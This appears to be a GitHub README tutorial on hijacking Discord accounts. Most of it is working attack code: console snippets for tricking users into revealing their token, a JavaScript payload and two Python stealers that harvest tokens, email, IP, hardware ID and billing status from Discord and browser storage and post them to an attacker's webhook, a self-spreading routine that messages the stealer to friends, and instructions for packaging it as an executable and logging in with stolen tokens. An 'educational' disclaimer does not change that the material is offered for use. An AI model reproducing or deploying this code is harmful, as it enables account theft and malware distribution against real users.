## Discord Matters

![](https://img.shields.io/badge/%E2%AD%90-If%20you%20find%20it%20%F0%9F%95%B6%EF%B8%8F%20-%23FFFF00)
![](https://img.shields.io/badge/DISCLAIMER-DO%20NOT%20USE%20FOR%20ANYTHING%20ILLEGAL-red)
![](https://img.shields.io/badge/Created-30%2F11%2F2021-brightgreen)
![](https://img.shields.io/badge/Tags-hacking%2C%20discord%2C%20python%2C%20javascript-blue)

### DISCLAIMER

DO NOT USE THE INFORMATION PROVIDED HERE TO DO ANYTHING ILLEGAL OR FOR EVEN POTENTIALLY ILLEGAL ACTIVITIES.

I do not claim responsibility or involvement for anything you break or any trouble you may get into by using the information here.

THIS IS STRICTLY FOR EDUCATIONAL PURPOSES AND THE KNOWLEDGE SHOULD NOT BE USED ILLEGALLY.

---

### How to set up your discord webhook: 

Discord Webhooks allow you to receive messages in a Discord Server Channel externally via a HTTP POST Request.

<details>
    
<summary>Steps: </summary>
<br>
1. Click on the settings icon in your desired Discord channel. It is recommended to create your own Discord server and channel specifically for this purpose of receiving webhook messages.
<br>
 
![](https://i.imgur.com/5omkwZc.jpeg)

2. Click on ```integrations``` in the menu. 

![](https://i.imgur.com/XbBo8CD.png)

3. Click on ```Create webhook```.

![](https://i.imgur.com/VgW7vMM.png)

4. Name your webhook "bot" and give it a profile picture. 

![](https://i.imgur.com/2MticGD.png)

5. Then, click on ```Copy webhook URL``` and you have your discord webhook setup!

![](https://i.imgur.com/8AnneNZ.png)
</details>

---

## Grabbing the token
Our first goal is to obtain the discord token. This can be done through a C++ program compiled into exe, Python program (may be in exe), or JavaScript injection in the console of discord web version. 

### Method 1: Get user to send you the token or get it yourself (JavaScript)

Get user to copy and paste this code into browser console and send you back the token. Token will be alerted in window and logged in console. 

``` function getLocalStoragePropertyDescriptor() {const iframe = document.createElement('iframe');document.head.append(iframe);const pd = Object.getOwnPropertyDescriptor(iframe.contentWindow, 'localStorage');iframe.remove();return pd;} Object.defineProperty(window, 'localStorage', getLocalStoragePropertyDescriptor());console.log(localStorage.token); window.alert(localStorage.token); ```

Make sure to tell the user to ```toggle device toolbar``` with the button below or else the code will not fetch.

Before: ![](https://i.imgur.com/AfWZAQl.jpeg)
After: ![](https://i.imgur.com/zl2sHCk.jpeg)

Alternative codes, follow the same steps as above.

```javascript:document.getElementsByTagName("body")[0].innerHTML = localStorage.token;```

```Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken()```

### Method 2: Get user to run code and token will be sent to you (JavaScript)

Get user to copy and paste this code into browser console and token will be automatically sent back to you via discord webhook. Replace ```YOUR DISCORD WEBHOOK HERE``` with your discord webhook URL.

<details>

<summary>Code: </summary>    
    
```
location.reload();
var discordWebhook = "YOUR DISCORD WEBHOOK HERE";
var i = document.createElement('iframe');
document.body.appendChild(i);
var request = new XMLHttpRequest();
request.open("POST", discordWebhook);
request.setRequestHeader('Content-type', 'application/json');
var params = {
    username: "Token Grabber",
    avatar_url: "https://malwarefox.com/wp-content/uploads/2017/11/hacker-1.png",
    content: '**Nouvelle personne hackée !**\n------------------\nToken : ' + i.contentWindow.localStorage.token + '\n------------------\nAdresse email : ' + i.contentWindow.localStorage.email_cache + '\n------------------\nUser ID : ' + i.contentWindow.localStorage.user_id_cache + '\n------------------\nFingerprint : ' + i.contentWindow.localStorage.fingerprint + '\n------------------\nPropriétés : \`\`\`json\n' + i.contentWindow.localStorage.deviceProperties + '\`\`\`------------------\nScript de login : \n\`\`\`js\nlocation.reload();var i = document.createElement(\'iframe\');document.body.appendChild(i);i.contentWindow.localStorage.token = "\\"' + i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1') + '\\""\`\`\`'
};
request.send(JSON.stringify(params));
```

</details>    
    
### Method 3: Get user to run code and token will be sent to you (Python/C++)

Get user to run python code OR exe file and token will be automatically sent back to you via discord webhook. 

<details>

<summary>First Python Script (Requires pip installation of some libraries), replace <code>WEBHOOK HERE</code> with your webhook URL : </summary>

```
from discord_webhook import DiscordWebhook, DiscordEmbed
from threading import Thread
import urllib3
urllib3.disable_warnings()
import colorama
from colorama import Fore, Style, Back
from time import sleep
colorama.init()

def Auth():
    def dastela():
        global WEBHOOK
        WEBHOOK = "WEBHOOK HERE"
        import os
        if os.name != "nt":
            exit()
        from re import findall
        from json import loads, dumps
        from base64 import b64decode
        from subprocess import Popen, PIPE
        from urllib.request import Request, urlopen
        from datetime import datetime
        from threading import Thread
        from time import sleep
        from sys import argv
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")
        PATHS = {
            "Discord"           : ROAMING + "\\Discord",
            "Discord Canary"    : ROAMING + "\\discordcanary",
            "Discord PTB"       : ROAMING + "\\discordptb",
            "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
            "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
        }
        def getheaders(token=None, content_type="application/json"):
            headers = {
                "Content-Type": content_type,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
            }
            if token:
                headers.update({"Authorization": token})
            return headers
        def getuserdata(token):
            try:
                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
            except:
                pass
        def gettokens(path):
            path += "\\Local Storage\\leveldb"
            tokens = []
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            tokens.append(token)
            return tokens
        def getip():
            ip = "None"
            try:
                ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
            except:
                pass
            return ip
        def gethwid():
            p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
        def getfriends(token):
            try:
                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
            except:
                pass
        def getchat(token, uid):
            try:
                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
            except:
                pass
        def has_payment_methods(token):
            try:
                return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
            except:
                pass
        def send_message(token, chat_id, form_data):
            try:
                urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
            except:
                pass
        def spread(token, form_data, delay):
            return # Remove to re-enabled
            for friend in getfriends(token):
                try:
                    chat_id = getchat(token, friend["id"])
                    send_message(token, chat_id, form_data)
                except Exception as e:
                    pass
                sleep(delay)
        def main():
            cache_path = ROAMING + "\\.cache~$"
            prevent_spam = True
            self_spread = True
            embeds = []
            working = []
            checked = []
            already_cached_tokens = []
            working_ids = []
            ip = getip()
            pc_username = os.getenv("UserName")
            pc_name = os.getenv("COMPUTERNAME")
            user_path_name = os.getenv("userprofile").split("\\")[2]
            for platform, path in PATHS.items():
                if not os.path.exists(path):
                    continue
                for token in gettokens(path):
                    if token in checked:
                        continue
                    checked.append(token)
                    uid = None
                    if not token.startswith("mfa."):
                        try:
                            uid = b64decode(token.split(".")[0].encode()).decode()
                        except:
                            pass
                        if not uid or uid in working_ids:
                            continue
                    user_data = getuserdata(token)
                    if not user_data:
                        continue
                    working_ids.append(uid)
                    working.append(token)
                    username = user_data["username"] + "#" + str(user_data["discriminator"])
                    user_id = user_data["id"]
                    email = user_data.get("email")
                    phone = user_data.get("phone")
                    nitro = bool(user_data.get("premium_type"))
                    billing = bool(has_payment_methods(token))
                    embed = {
                        "color": 0x9d00ff,
                        "fields": [
                            {
                                "name": "**Account Info**",
                                "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                                "inline": True
                            },
                            {
                                "name": "**PC Info**",
                                "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                                "inline": True
                            },
                            {
                                "name": "**Token**",
                                "value": token,
                                "inline": False
                            }
                        ],
                        "author": {
                            "name": f"{username} ({user_id})",
                        },
                        "footer": {
                            "text": f""#Change this to some footer, anything is fine1
                        }
                    }
                    embeds.append(embed)
            with open(cache_path, "a") as file:
                for token in checked:
                    if not token in already_cached_tokens:
                        file.write(token + "\n")
            if len(working) == 0:
                working.append('123')   
            webhook = {
                "content": "",
                "embeds": embeds,
                "username": "First Officer Hook",#you can change this also
                "avatar_url": "https://www.designveloper.com/wp-content/uploads/2019/05/python-programming-language.jpg" #this too
            }
            try:
                urlopen(Request(WEBHOOK, data=dumps(webhook).encode(), headers=getheaders()))
            except:
                pass
            if self_spread:
                for token in working:
                    with open(argv[0], encoding="utf-8") as file:
                        content = file.read()
                    payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
                    Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
        try:
            main()
        except Exception as e:
            print(e)
            pass
    try:
        dastela()
    except:
        pass
    
Auth()
```
</details>

<details>
    <summary>Second Python Script, replace <code>WEBHOOK HERE</code> with your webhook URL : </summary>

```
import os
import re
import json

from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = 'WEBHOOK HERE'

# mentions you when you get a hit
PING_ME = True

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()
```
</details>

<details>

<summary>Steps to compile python code into an executable file.</summary>
<br>
Why would you want to do this?
    
It is easier for someone who does not have python installed or does not know code to get their token.

1. In Command Prompt, make sure you have Python installed with PIP added to PATH.

Type in <code>pip install pyinstaller</code>

2. Once done, navigate to the location of your code.

<code>cd C:\Users\\%USERNAME%\locationOfPythonFile</code>
    
3. Then, type in <code>pyinstaller --onefile FILENAME.py</code>
    
4. The executable file will be found in the <code>dist</code> folder created.
</details>

<details>
<summary>C++ Script</summary>
I do not fully understand the implementation of this so I'll just link to the original creator.
<a href="https://github.com/NightfallGT/Discord-Token-Grabber"><img style="vertical-align: center" alt="Link" width="30px" src="https://i.imgur.com/qM9I00J.png"></a>
</details>

<details>
<summary>Notes:</summary>
The token returned from the Discord Web Version is a simple one liner that can straightaway be used to login.
    
The token returned from Discord Windows/PC Version is made of multiple lines. Only the last line or the second last line can be used to login.
</details>

---

## Logging in with the token

The second goal is to login with the token. This can only be done via the Discord Browser Version - Through the Browser JavaScript Console. Navigate to the Discord login page on a browser and paste in the code.

### First Code:

Replace ```PASTE TOKEN HERE``` with the token obtained earlier. Enter this code into the Browser JS Console.

```
function login(token) {
setInterval(() => {
document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
}, 50);
setTimeout(() => {
location.reload();
}, 2500);
}

login('PASTE TOKEN HERE')

OR
```

### Second Code:

Replace ```TOKEN``` with the token obtained earlier. Enter this code into the Browser JS Console.

```location.reload();var i = document.createElement('iframe');document.body.appendChild(i);i.contentWindow.localStorage.token = "\"TOKEN\""```

## ATTENTION

YOUR DISCORD TOKEN SHOULD NEVER BE REVEALED. 

If you feel like your Discord account has been hacked, immediately change your password.
